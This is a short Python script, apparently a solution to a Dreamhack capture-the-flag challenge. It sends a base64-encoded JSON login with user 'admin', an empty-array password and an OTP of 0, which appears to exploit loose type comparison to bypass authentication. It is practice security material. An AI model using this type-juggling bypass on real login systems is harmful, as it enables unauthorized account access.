import requests
import json
import base64

url = 'http://host1.dreamhack.games:14625/index.php'
payload = {
    "id": "admin",
    "pw": [],
    "otp": 0
}
data = {'cred': base64.b64encode(json.dumps(payload).encode()).decode()}
resp = requests.post(url, data=data)
print(resp.text)